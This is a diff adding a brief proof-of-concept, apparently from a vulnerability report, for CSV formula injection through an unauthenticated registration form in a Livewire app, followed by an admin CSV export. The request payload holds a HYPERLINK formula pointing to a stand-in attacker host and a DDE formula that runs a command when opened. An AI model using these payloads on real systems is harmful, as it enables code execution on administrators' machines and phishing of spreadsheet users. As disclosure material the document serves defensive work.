@@ -1,0 +1,7 @@
+### 1) Unauthenticated registration with formula fields
+POST /livewire-5f244c96/update
+
+{"components":[{"snapshot":"<RegistrationWizard>","updates":{"currentStep":4,"contacts":[],"lastname":"=HYPERLINK(\"http://evil.tld/a96d3ef9\",\"clickme\")","idnumber":"=cmd|'/c calc'!A0","email":"csv_a96d3ef9@example.invalid",...},"calls":[{"path":"","method":"register","params":[]}]}]}
+
+### 2) Admin triggers the CSV export (table action)
+POST /livewire-5f244c96/update  # mountAction('export',{},{table:true}) then callMountedAction
